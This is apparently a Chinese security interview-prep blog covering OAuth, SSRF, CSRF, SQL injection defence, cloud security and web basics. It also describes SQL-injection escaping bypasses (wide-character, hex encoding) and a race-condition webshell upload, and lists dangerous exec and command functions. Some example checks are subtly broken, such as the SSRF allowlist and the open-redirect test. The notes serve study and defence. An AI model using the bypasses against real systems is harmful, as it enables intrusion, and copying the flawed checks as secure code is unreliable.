function_">quick_select</span>(<span class="params">arr, k</span>):</span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(arr) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        pivot_index = partition(arr, left, right)</span><br><span class="line">        <span class="keyword">if</span> pivot_index == k:</span><br><span class="line">            <span class="keyword">return</span> arr[pivot_index]</span><br><span class="line">        <span class="keyword">elif</span> pivot_index &lt; k:</span><br><span class="line">            left = pivot_index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = pivot_index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numbers = [random.randint(<span class="number">0</span>, <span class="number">10</span>**<span class="number">9</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">8</span>)]</span><br><span class="line">median = quick_select(numbers, <span class="built_in">len</span>(numbers) // <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(median)</span><br></pre></td></tr></table></figure><p><strong>解法 2：最小堆（O(N log K)）</strong></p><ul><li>维护一个 <strong>大小为 N&#x2F;2+1 的最小堆</strong>，堆顶即为中位数。</li></ul><hr><h3 id="调试工具及异常排查流程？"><a href="#调试工具及异常排查流程？" class="headerlink" title="调试工具及异常排查流程？"></a><strong>调试工具及异常排查流程？</strong></h3><p><strong>常见调试工具</strong>：</p><ul><li>**<code>top</code> &#x2F; <code>htop</code>**（CPU、内存使用）</li><li>**<code>strace</code>**（系统调用跟踪）</li><li>**<code>gdb</code>**（C&#x2F;C++ 调试）</li><li>**<code>jstack</code>**（Java 线程堆栈）</li></ul><p><strong>异常排查流程</strong>：</p><ol><li><strong>日志分析</strong>（<code>tail -f logs/app.log</code>）</li><li><strong>检查资源占用</strong>（<code>top</code>、<code>ps aux</code>）</li><li><strong>网络连通性</strong>（<code>ping</code>、<code>telnet</code>）</li><li><strong>代码级 Debug（gdb、pdb）</strong></li></ol><hr><h3 id="数据库索引结构，什么情况下应该建唯一索引？"><a href="#数据库索引结构，什么情况下应该建唯一索引？" class="headerlink" title="数据库索引结构，什么情况下应该建唯一索引？"></a><strong>数据库索引结构，什么情况下应该建唯一索引？</strong></h3><table><thead><tr><th><strong>索引类型</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr><td><strong>唯一索引（Unique Index）</strong></td><td>防止重复数据，如 <code>用户名</code>、<code>邮箱</code></td></tr><tr><td><strong>普通索引（Index）</strong></td><td>加速查询，如 <code>WHERE status=1</code></td></tr><tr><td><strong>复合索引（Composite Index）</strong></td><td>多条件查询，如 <code>(user_id, order_date)</code></td></tr></tbody></table><p><strong>唯一索引示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX idx_email <span class="keyword">ON</span> users(email);</span><br></pre></td></tr></table></figure><hr><h3 id="数据库分页语句如何写？"><a href="#数据库分页语句如何写？" class="headerlink" title="数据库分页语句如何写？"></a><strong>数据库分页语句如何写？</strong></h3><h2 id="MySQL-分页查询：优化方式：1-使用覆盖索引：-2-避免-OFFSET-扫描（适用于大数据量）："><a href="#MySQL-分页查询：优化方式：1-使用覆盖索引：-2-避免-OFFSET-扫描（适用于大数据量）：" class="headerlink" title="MySQL 分页查询：优化方式：1. 使用覆盖索引：   2. 避免 OFFSET 扫描（适用于大数据量）：   "></a><strong>MySQL 分页查询</strong>：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br><strong>优化方式</strong>：<br>1. <strong>使用覆盖索引</strong>：<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>避免 <code>OFFSET</code> 扫描</strong>（适用于大数据量）：<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">1000</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure></h2><h3 id="HTTPS-交互过程"><a href="#HTTPS-交互过程" class="headerlink" title="HTTPS 交互过程"></a><strong>HTTPS 交互过程</strong></h3><ol><li><strong>客户端发起请求</strong>：<ul><li>浏览器访问 <code>https://example.com</code>，请求服务器的 <strong>TLS 证书</strong>。</li></ul></li><li><strong>服务器返回 SSL 证书</strong>：<ul><li>服务器提供 <strong>公钥证书（CA 签发）</strong>。</li></ul></li><li><strong>客户端验证证书</strong>：<ul><li>检查 <strong>是否被信任</strong>，证书是否 <strong>过期&#x2F;吊销</strong>。</li></ul></li><li><strong>密钥协商</strong>：<ul><li>使用 <strong>Diffie-Hellman &#x2F; RSA</strong> 生成对称密钥。</li></ul></li><li><strong>加密数据传输</strong>：<ul><li>客户端使用对称密钥进行加密通信。</li></ul></li></ol><hr><h3 id="OAuth2-0-交互过程及不当安全风险"><a href="#OAuth2-0-交互过程及不当安全风险" class="headerlink" title="OAuth2.0 交互过程及不当安全风险"></a><strong>OAuth2.0 交互过程及不当安全风险</strong></h3><p><strong>OAuth2.0 授权流程</strong>：</p><ol><li>用户访问 <strong>Client（第三方应用）</strong> 并请求授权。</li><li>Client 跳转到 <strong>OAuth 服务器</strong> 获取授权码（<code>Authorization Code</code>）。</li><li>OAuth 服务器重定向回 Client 并携带授权码。</li><li>Client 用授权码换取 <strong>Access Token</strong>。</li><li>Client 使用 <code>Access Token</code> 访问受保护资源。</li></ol><p><strong>安全风险</strong>：</p><ul><li><strong>Token 泄露</strong>：<ul><li>解决方案：使用 <strong>短期 Token + Refresh Token</strong>。</li></ul></li><li><strong>重放攻击</strong>：<ul><li>解决方案：绑定 <code>PKCE（Code Verifier）</code>。</li></ul></li><li><strong>恶意 Client 滥用 Token</strong>：<ul><li>解决方案：严格验证 <code>redirect_uri</code>，只允许白名单域名。</li></ul></li></ul><hr><h3 id="获取-URL-内容时的安全注意事项"><a href="#获取-URL-内容时的安全注意事项" class="headerlink" title="获取 URL 内容时的安全注意事项"></a><strong>获取 URL 内容时的安全注意事项</strong></h3><p><strong>防御措施</strong>：</p><ol><li><strong>防止 SSRF（服务器端请求伪造）</strong>：<ul><li>仅允许白名单 URL：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allowed_hosts = [<span class="string">&quot;https://trusted.com&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> urlparse(user_input_url).netloc <span class="keyword">not</span> <span class="keyword">in</span> allowed_hosts:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法请求&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>防止 Open Redirect</strong>：<ul><li>禁止 <code>http://attacker.com</code> 伪装成 <code>example.com</code>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://trusted.com&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法 URL&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>超时控制</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(user_input_url, timeout=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="参数入库前如何过滤？"><a href="#参数入库前如何过滤？" class="headerlink" title="参数入库前如何过滤？"></a><strong>参数入库前如何过滤？</strong></h3><p><strong>预防 SQL 注入的措施</strong>：</p><ol><li><strong>使用参数化查询</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_input,))</span><br></pre></td></tr></table></figure></li><li><strong>使用 ORM 框架</strong>：<ul><li>避免直接拼接 SQL，使用 <code>SQLAlchemy</code>、<code>Django ORM</code>。</li></ul></li><li><strong>正则校验</strong>：<ul><li>仅允许数字、字母：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-zA-Z0-9]+$&quot;</span>, user_input):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法输入&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="过滤器和拦截器原理和应用场景？"><a href="#过滤器和拦截器原理和应用场景？" class="headerlink" title="过滤器和拦截器原理和应用场景？"></a><strong>过滤器和拦截器原理和应用场景？</strong></h3><table><thead><tr><th><strong>概念</strong></th><th><strong>作用</strong></th><th><strong>应用场景</strong></th></tr></thead><tbody><tr><td><strong>过滤器（Filter）</strong></td><td>处理 <strong>请求&#x2F;响应</strong></td><td>认证、日志记录</td></tr><tr><td><strong>拦截器（Interceptor）</strong></td><td>控制 <strong>方法调用</strong></td><td>AOP（切面编程）、权限校验</td></tr></tbody></table><p><strong>示例：Spring 拦截器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!request.getHeader(<span class="string">&quot;Authorization&quot;</span>).startsWith(<span class="string">&quot;Bearer&quot;</span>)) &#123;</span><br><span class="line">            response.setStatus(<span class="number">403</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="SESSION-和-Cookie-的区别"><a href="#SESSION-和-Cookie-的区别" class="headerlink" title="SESSION 和 Cookie 的区别"></a><strong>SESSION 和 Cookie 的区别</strong></h3><table><thead><tr><th><strong>特性</strong></th><th><strong>SESSION</strong></th><th><strong>Cookie</strong></th></tr></thead><tbody><tr><td><strong>存储位置</strong></td><td>服务器</td><td>客户端</td></tr><tr><td><strong>生命周期</strong></td><td>会话结束</td><td>可设定过期时间</td></tr><tr><td><strong>安全性</strong></td><td>高，存储在服务器</td><td>易被窃取</td></tr></tbody></table><p><strong>使用场景</strong>：</p><ul><li><strong>SESSION</strong> 适用于 <strong>短期会话（如登录）</strong>。</li><li><strong>COOKIE</strong> 适用于 <strong>长期标识用户（如自动登录）</strong>。</li></ul><hr><h3 id="SESSION-ID-如何不被-JavaScript-读取？"><a href="#SESSION-ID-如何不被-JavaScript-读取？" class="headerlink" title="SESSION ID 如何不被 JavaScript 读取？"></a><strong>SESSION ID 如何不被 JavaScript 读取？</strong></h3><p><strong>防御方案</strong>：</p><ol><li><strong>设置 <code>HttpOnly</code></strong><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; HttpOnly</span><br></pre></td></tr></table></figure><ul><li>防止 JavaScript 通过 <code>document.cookie</code> 访问 <code>SESSION ID</code>。</li></ul></li><li><strong>使用 <code>SameSite=Strict</code></strong> 防御 CSRF：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; SameSite=Strict</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="CSRF-Token-如何设计？"><a href="#CSRF-Token-如何设计？" class="headerlink" title="CSRF Token 如何设计？"></a><strong>CSRF Token 如何设计？</strong></h3><p><strong>CSRF 防御方案</strong>：</p><ol><li><strong>生成随机 Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line">csrf_token = secrets.token_hex(<span class="number">32</span>)</span><br></pre></td></tr></table></figure></li><li><strong>Token 绑定 Session</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;csrf_token&quot;</span>] = csrf_token</span><br></pre></td></tr></table></figure></li><li><strong>请求时校验 Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.form[<span class="string">&quot;csrf_token&quot;</span>] != session[<span class="string">&quot;csrf_token&quot;</span>]:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;CSRF 攻击&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="同源策略？如何实现安全的跨域请求？"><a href="#同源策略？如何实现安全的跨域请求？" class="headerlink" title="同源策略？如何实现安全的跨域请求？"></a><strong>同源策略？如何实现安全的跨域请求？</strong></h3><p><strong>同源策略（Same-Origin Policy，SOP）</strong></p><ul><li><strong>浏览器安全机制</strong>，阻止不同域之间的 <code>JavaScript</code> 访问。</li></ul><p><strong>跨域解决方案</strong>：</p><ol><li><strong>CORS（跨域资源共享）</strong><ul><li>服务器允许特定域访问：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>JSONP（仅支持 GET 请求）</strong><ul><li>通过 <code>script</code> 标签跨域：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://api.example.com/data?callback=myFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>Nginx 代理</strong><ul><li>配置 <code>Nginx</code> 反向代理：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /api/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> https://backend.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="安全架构方向"><a href="#安全架构方向" class="headerlink" title="安全架构方向"></a>安全架构方向</h2><h3 id="传统-IDC、云上、混合云架构的安全差异和挑战"><a href="#传统-IDC、云上、混合云架构的安全差异和挑战" class="headerlink" title="传统 IDC、云上、混合云架构的安全差异和挑战"></a><strong>传统 IDC、云上、混合云架构的安全差异和挑战</strong></h3><table><thead><tr><th><strong>架构</strong></th><th><strong>安全挑战</strong></th></tr></thead><tbody><tr><td><strong>传统 IDC</strong></td><td>需要物理安全防护，硬件防火墙，网络隔离</td></tr><tr><td><strong>云上架构</strong></td><td>依赖 CSP（云服务提供商）安全策略，数据共享风险</td></tr><tr><td><strong>混合云</strong></td><td>需要 <strong>VPN &#x2F; Zero Trust</strong> 保障多云互通，防止数据泄露</td></tr></tbody></table><p><strong>挑战</strong>：</p><ul><li><strong>访问控制</strong>：如何限制云端数据访问？</li><li><strong>合规性</strong>：云端数据存储是否符合 <strong>GDPR、HIPAA</strong>？</li><li><strong>供应链安全</strong>：第三方 API、插件是否可信？</li></ul><hr><h3 id="云原生技术下的安全变化"><a href="#云原生技术下的安全变化" class="headerlink" title="云原生技术下的安全变化"></a><strong>云原生技术下的安全变化</strong></h3><p><strong>主要变化</strong>：</p><ol><li><strong>安全边界模糊</strong>：<ul><li>传统 <strong>防火墙</strong> 保护边界 -&gt; <strong>微服务</strong>、<strong>API</strong> 需要细粒度权限控制。</li></ul></li><li><strong>容器 &amp; Kubernetes 安全</strong>：<ul><li>容器逃逸、K8s API 访问控制：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>DevSecOps</strong>：<ul><li>安全左移，代码级安全扫描（SAST、DAST、IAST）。</li></ul></li></ol><hr><h3 id="纯云业务如何设计安全架构？"><a href="#纯云业务如何设计安全架构？" class="headerlink" title="纯云业务如何设计安全架构？"></a><strong>纯云业务如何设计安全架构？</strong></h3><p><strong>云安全架构关键点</strong>：</p><ol><li><strong>IAM（身份访问管理）</strong>：<ul><li>避免 <code>root</code> 权限直接操作，使用 <strong>细粒度 RBAC</strong>。</li></ul></li><li><strong>数据加密</strong>：<ul><li><strong>存储加密（S3、RDS 加密）</strong></li><li><strong>传输加密（TLS 1.3 + mTLS）</strong></li></ul></li><li><strong>安全监控 &amp; 审计</strong>：<ul><li>使用 <strong>CloudTrail</strong>、<strong>SIEM</strong> 进行异常检测。</li></ul></li></ol><hr><h3 id="SDL-中的关键点以及如何解决？"><a href="#SDL-中的关键点以及如何解决？" class="headerlink" title="SDL 中的关键点以及如何解决？"></a><strong>SDL 中的关键点以及如何解决？</strong></h3><p><strong>SDL（安全开发生命周期，Secure Development Lifecycle）关键点</strong>：</p><ol><li><strong>威胁建模（Threat Modeling）</strong>：<ul><li>识别业务关键点，如 <strong>身份认证、支付接口</strong>。</li></ul></li><li><strong>安全代码审计（SAST&#x2F;DAST）</strong>：<ul><li>使用 <strong>SonarQube、Checkmarx</strong> 检测漏洞。</li></ul></li><li><strong>漏洞管理 &amp; 修复</strong>：<ul><li>结合 <strong>DevSecOps</strong>，在 CI&#x2F;CD 进行 <strong>自动化漏洞扫描</strong>。</li></ul></li></ol><hr><h3 id="漏洞发现在甲方和乙方的区别？"><a href="#漏洞发现在甲方和乙方的区别？" class="headerlink" title="漏洞发现在甲方和乙方的区别？"></a><strong>漏洞发现在甲方和乙方的区别？</strong></h3><table><thead><tr><th><strong>角色</strong></th><th><strong>关注点</strong></th><th><strong>安全策略</strong></th></tr></thead><tbody><tr><td><strong>甲方（企业安全团队）</strong></td><td>业务风险、合规性</td><td><strong>WAF、DLP、SIEM</strong></td></tr><tr><td><strong>乙方（安全公司）</strong></td><td>技术漏洞、渗透测试</td><td><strong>红队演练、攻防对抗</strong></td></tr></tbody></table><hr><h3 id="如何防止-0day-攻击？"><a href="#如何防止-0day-攻击？" class="headerlink" title="如何防止 0day 攻击？"></a><strong>如何防止 0day 攻击？</strong></h3><ol><li><strong>启用应用白名单</strong>：<ul><li>限制运行未知程序：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Restricted</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>漏洞管理 &amp; 补丁更新</strong>：<ul><li><strong>使用 WAF 过滤异常流量</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~* &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>启用 RASP（运行时安全防护）</strong>：<ul><li>监控运行时攻击行为，拦截 RCE。</li></ul></li></ol><hr><h3 id="不同企业不同阶段、不同体量的安全建设方法、区别及侧重"><a href="#不同企业不同阶段、不同体量的安全建设方法、区别及侧重" class="headerlink" title="不同企业不同阶段、不同体量的安全建设方法、区别及侧重"></a><strong>不同企业不同阶段、不同体量的安全建设方法、区别及侧重</strong></h3><table><thead><tr><th><strong>企业阶段</strong></th><th><strong>安全策略</strong></th></tr></thead><tbody><tr><td><strong>初创企业</strong></td><td>基础安全（云安全配置、Web 防护）</td></tr><tr><td><strong>中型企业</strong></td><td>合规 &amp; 业务风控（数据加密、访问控制）</td></tr><tr><td><strong>大型企业</strong></td><td>高级威胁检测（EDR、SIEM、攻防演练）</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【工作】面试题整理 常见问题</title>
      <link href="/2024/03/03/work/workpre2/"/>
      <url>/2024/03/03/work/workpre2/</url>
      
        <content type="html"><![CDATA[<h2 id="cookie-和-session-的区别"><a href="#cookie-和-session-的区别" class="headerlink" title="cookie 和 session 的区别"></a>cookie 和 session 的区别</h2><p>cookie 和 session 都是客户端与服务器之间保持状态的解决方案。<br>1）存储的位置不同<br>cookie 存放在客户端，session 存放在服务端。session 存储的数据比较安全</p><p>2）存储的数据类型不同<br>两者都是 key-value 的结构，但针对 value 的类型是有差异的：<br>cookie：value 只能是字符串类型，session：value 是 Object 类型</p><p>3）存储的数据大小限制不同<br>cookie 大小受浏览器的限制，很多是 4K 的大小；session 理论上受当前内存的限制</p><p>4）生命周期的控制<br>cookie 的生命周期当浏览器关闭的时候，就消亡了。<br>cookie 的生命周期是累计的，从创建时，就开始计时，20 分钟后，cookie 生命周期结束；<br>session 的生命周期是间隔的，从创建时，开始计时如在 20 分钟，没有访问 session，那么 session 生命周期被销毁。</p><h2 id="GET-和-POST-的区别"><a href="#GET-和-POST-的区别" class="headerlink" title="GET 和 POST 的区别"></a>GET 和 POST 的区别</h2><p>1）GET 是获取数据；POST 是修改数据<br>2）GET 把请求的数据放在 url 上，以?分割 URL 和传输数据，参数之间以&amp;相连，所以 GET 不太安全；而 POST 把数据放在 HTTP 的包体内（request body）<br>3）GET 提交的数据最大是 2k（限制实际上取决于浏览器）；POST 理论上没有限制。<br>4）GET 产生一个 TCP 数据包，浏览器会把 http header 和 data 一并发送出去，服务器响应 200(返回数据)；POST 产生两个 TCP 数据包，浏览器先发送 header，服务器响应 100 continue，浏览器再发送 data，服务器响应 200 ok(返回数据)<br>5）GET 请求会被浏览器主动缓存；而 POST 不会，除非手动设置</p><h2 id="OSI-的七层模型都有哪些"><a href="#OSI-的七层模型都有哪些" class="headerlink" title="OSI 的七层模型都有哪些"></a>OSI 的七层模型都有哪些</h2><p>物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。<br>数据链路层：接收来自物理层的位流形式的数据，并封装成帧，传送到上一层<br>网络层：将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。<br>传输层：在源端与目的端之间提供可靠的透明数据传输<br>会话层：负责在网络中的两节点之间建立、维持和终止通信<br>表示层：处理用户信息的表示问题，数据的编码，压缩和解压缩，数据的加密和解密<br>应用层：为用户的应用进程提供网络通信服务</p><h2 id="条件竞争漏洞原理与举例"><a href="#条件竞争漏洞原理与举例" class="headerlink" title="条件竞争漏洞原理与举例"></a>条件竞争漏洞原理与举例</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。<br>举个例子，很多 web 程序都会有上传文件的功能，头像和图像等，服务器肯定会检查文件是否满足条件，不满足的要被删除。那么问题就在于，如果我们采用大量的并发请求，就传递一个生成恶意 webshell 的图像，访问它就可以生成 webshell。<br>在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。<br>至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功地在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p><h2 id="XSS-攻击如何进行防护"><a href="#XSS-攻击如何进行防护" class="headerlink" title="XSS 攻击如何进行防护"></a>XSS 攻击如何进行防护</h2><p>1）将 HTML 元素内容、属性以及 URL 请求参数、CSS 值进行编码<br>2）当编码影响业务时，使用白名单规则进行检测和过滤<br>3）使用 W3C 提出的 CSP (Content Security Policy，内容安全策略)，定义域名白名单<br>4）设置 Cookie 的 HttpOnly 属性。</p><h2 id="应该如何防范-CSRF-攻击"><a href="#应该如何防范-CSRF-攻击" class="headerlink" title="应该如何防范 CSRF 攻击"></a>应该如何防范 CSRF 攻击</h2><p>1）针对实际情况，设置关键 Cookie 的 SameSite 属性为 Strict 或 Lax<br>2）服务端验证请求来源站点(Referer、Origin)<br>3）使用 CSRF Token，服务端随机生成返回给浏览器的 Token，每一次请求都会携带不同的 CSRF Token<br>4）加入二次验证(独立的支付密码)</p><h2 id="如何突破注入时字符被转义"><a href="#如何突破注入时字符被转义" class="headerlink" title="如何突破注入时字符被转义"></a>如何突破注入时字符被转义</h2><p>宽字符注入、hex 编码绕过</p><ul><li>宽字符注入：宽字符注入是一种利用宽字符集中的字符进行SQL注入的技术。在某些数据库系统中，宽字符集中的字符可能不会被正确地转义，从而可以绕过安全措施。例如，在MySQL中，可以使用%df来表示一个宽字符，然后在注入的SQL语句中使用这个字符。</li><li>Hex编码绕过：将注入的SQL语句中的特定字符转换为十六进制编码，可以绕过一些简单的字符过滤机制。例如，如果’（单引号）被过滤，可以使用0x27来代替。</li><li>使用URL编码：URL编码是一种将字符转换为%后跟两位十六进制数的方法，这可以绕过一些基于字符串匹配的安全检查。例如，%22是双引号”的URL编码，%3C是小于号&lt;的URL编码。</li></ul><h2 id="在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下："><a href="#在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：" class="headerlink" title="在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下："></a>在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>代码执行</p><ul><li><code>eval()</code>: 把字符串作为PHP代码执行。</li><li><code>assert()</code>: 执行一个字符串作为PHP代码（需要开启assertion）。</li><li><code>create_function()</code>: 创建一个匿名（Lambda风格）函数（已在PHP 7.2中废弃）。</li><li><code>call_user_func()</code> 和 <code>call_user_func_array()</code>: 调用回调函数。</li></ul><p>文件读取</p><ul><li><code>file_get_contents()</code>: 读取整个文件的内容。</li><li><code>highlight_file()</code>: 显示文件的源代码并高亮显示关键字。</li><li><code>fopen()</code>, <code>readfile()</code>, <code>fread()</code>, <code>fgets()</code>, <code>fgetss()</code>: 用于打开文件、读取文件内容。</li><li><code>parse_ini_file()</code>: 解析配置文件。</li><li><code>show_source()</code>: 显示文件源代码。</li><li><code>file()</code>: 将文件读入一个数组中，每行作为一个数组元素。</li></ul><p>命令执行</p><ul><li><code>system()</code>: 执行外部程序，并显示输出。</li><li><code>exec()</code>: 执行外部程序，并返回输出作为字符串。</li><li><code>shell_exec()</code>: 执行外部shell命令，并返回完整的输出作为字符串。</li><li><code>passthru()</code>: 执行外部程序，并传递原始输出直接到浏览器。</li><li><code>pcntl_exec()</code>: 在当前进程空间执行指定程序（需要pcntl扩展）。</li><li><code>popen()</code> 和 <code>proc_open()</code>: 执行命令并打开用于输入和&#x2F;或输出的文件指针。</li></ul><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>代码执行: Java语言本身不提供直接执行字符串代码的函数，因为这会带来严重的安全风险。Java通过编译执行字节码，通常需要通过类加载器加载类文件。</p><p>文件读取</p><ul><li><code>java.nio.file.Files</code> 类中的 <code>readAllBytes()</code>, <code>readAllLines()</code>: 读取文件的所有字节或行。</li><li><code>java.io</code> 包中的 <code>FileInputStream</code>, <code>BufferedReader</code>: 用于读取文件的字节流和字符流。</li></ul><p>命令执行</p><ul><li><code>Runtime.getRuntime().exec()</code>: 执行指定命令并返回<code>Process</code>对象。</li><li><code>ProcessBuilder</code>: 启动操作系统进程，可以设置环境变量和工作目录。</li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>代码执行</p><ul><li><code>exec()</code>: 执行动态生成的Python代码字符串。</li><li><code>eval()</code>: 计算字符串表达式的值，并返回结果。</li><li><code>compile()</code>: 